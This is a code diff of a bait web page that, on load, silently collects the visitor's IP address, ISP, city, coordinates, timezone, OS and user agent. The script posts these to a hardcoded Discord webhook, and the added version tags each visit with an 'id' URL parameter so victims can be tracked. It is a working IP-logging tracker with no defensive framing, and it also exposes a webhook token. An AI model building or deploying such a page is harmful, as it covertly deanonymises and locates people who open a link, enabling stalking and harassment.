@@ -1,52 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>This is Bait!</title>
 </head>
 <body style="background-color:black;">
-    <script>async function fetchAndSendIPInfo() {
-        try {
-            // Fetch IP information from ipwhois.io API
-            const response = await fetch('https://ipwhois.app/json/');
-            const data = await response.json();
-    
-            // Construct the message with IP and PC information
-            const ipInfo = `
-    **IP Info:**
-    > **IP:** \`${data.ip || 'Unknown'}\`
-    > **Provider:** \`${data.isp || 'Unknown'}\`
-    > **ASN:** \`${data.asn || 'Unknown'}\`
-    > **Country:** \`${data.country || 'Unknown'}\`
-    > **Region:** \`${data.region || 'Unknown'}\`
-    > **City:** \`${data.city || 'Unknown'}\`
-    > **Coords:** \`${data.latitude && data.longitude ? data.latitude + ', ' + data.longitude : 'Unknown'}\`
-    > **Timezone:** \`${data.timezone_gmt || 'Unknown'}\`
-    
-    **PC Info:**
-    > **OS:** \`${navigator.platform}\`
-    > **Browser:** \`${navigator.userAgent}\`
-    
-    **User Agent:**
-    \`\`\`
-    ${navigator.userAgent}
-    \`\`\`
-            `;
-    
-            // Send the information to the Discord webhook
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1337589185695187005/jH1I8L6or30Yf8dVipM5RQ7MbARfoEi4ZyCQxcShxcw6Tm0QVUPtdm8oRtrFJAXs9giW';
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: ipInfo })
-            });
-    
-            console.log('IP information sent to Discord webhook successfully.');
-        } catch (error) {
-            console.error('Error fetching or sending IP information:', error);
+    <script>
+        async function fetchAndSendIPInfo() {
+            try {
+                // Fetch IP information from ipwhois.io API
+                const response = await fetch('https://ipwhois.app/json/');
+                const data = await response.json();
+
+                // Extract the 'id' parameter from the URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const id = urlParams.get('id') || 'No ID';
+
+                // Construct the message with IP and PC information
+                const ipInfo = `
+**ID:** \`${id}\`
+
+**IP Info:**
+> **IP:** \`${data.ip || 'Unknown'}\`
+> **Provider:** \`${data.isp || 'Unknown'}\`
+> **ASN:** \`${data.asn || 'Unknown'}\`
+> **Country:** \`${data.country || 'Unknown'}\`
+> **Region:** \`${data.region || 'Unknown'}\`
+> **City:** \`${data.city || 'Unknown'}\`
+> **Coords:** \`${data.latitude && data.longitude ? data.latitude + ', ' + data.longitude : 'Unknown'}\`
+> **Timezone:** \`${data.timezone_gmt || 'Unknown'}\`
+
+**PC Info:**
+> **OS:** \`${navigator.platform}\`
+> **Browser:** \`${navigator.userAgent}\`
+
+**User Agent:**
+\`\`\`
+${navigator.userAgent}
+\`\`\`
+
+
+                `;
+
+                // Send the information to the Discord webhook
+                const webhookUrl = 'https://discordapp.com/api/webhooks/1337589185695187005/jH1I8L6or30Yf8dVipM5RQ7MbARfoEi4ZyCQxcShxcw6Tm0QVUPtdm8oRtrFJAXs9giW';
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: ipInfo })
+                });
+
+                console.log('IP information sent to Discord webhook successfully.');
+            } catch (error) {
+                console.error('Error fetching or sending IP information:', error);
+            }
         }
-    }
-    
-    fetchAndSendIPInfo();
+
+        fetchAndSendIPInfo();
     </script>
     <img src="bait.png" alt="This is bait">
 </body>
